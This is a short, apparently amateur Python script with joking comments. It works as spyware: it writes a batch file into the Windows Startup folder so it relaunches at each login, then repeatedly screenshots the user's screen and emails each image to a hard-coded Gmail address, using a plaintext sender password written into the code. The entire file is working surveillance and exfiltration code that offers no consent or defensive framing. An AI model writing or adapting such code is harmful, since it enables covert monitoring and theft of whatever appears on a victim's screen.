# I don’t know how this shit works but it works
# uwu
import smtplib
from email.mime.multipart import MIMEMultipart

from email.mime.base import MIMEBase
from email import encoders
import pyautogui
import time
import getpass
import os

# this code move program to start-up
USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


# while timer
sender_email = "PlanshetGreg@gmail.com"
receiver_email = "OneGreg0ry4k@gmail.com"
add_to_startup()

time.sleep(6)
for i in range(15):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot1.png")
    # copied from documentation uwu

    message = MIMEMultipart()
    message["From"] = sender_email
    message['To'] = receiver_email
    message['Subject'] = "Report" + str(i)
    # Get file
    file = "screenshot1.png"
    attachment = open(file, 'rb')
    # Send mail
    # I don’t know what this shit does but it works
    obj = MIMEBase('application', 'octet-stream')
    obj.set_payload(attachment.read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', "attachment; filename= " + file)
    message.attach(obj)
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(sender_email, 'SofaNeLox')
    email_session.sendmail(sender_email, receiver_email, my_message)
    email_session.quit()
    print("Email send success")
